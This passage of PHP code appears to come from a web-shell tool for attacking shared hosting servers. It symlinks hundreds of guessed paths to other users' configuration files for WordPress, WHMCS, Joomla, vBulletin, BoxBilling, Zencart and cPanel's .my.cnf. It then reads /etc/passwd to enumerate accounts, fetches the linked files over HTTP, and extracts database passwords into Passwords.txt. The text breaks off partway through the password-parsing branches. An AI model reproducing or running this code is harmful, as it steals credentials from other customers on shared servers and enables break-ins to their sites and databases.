@symlink('/home9/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home9/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 10

@symlink('/home10/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home10/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home10/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home10/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/Exc_symconf/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);
}
elseif($uxl && preg_match('/admincpdir/i',$uxl))
{

//Vbulletin

$db=entre2v2($uxl,"password'] = '","';");
if(!empty($db))
$pass=$db."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
{

//Other

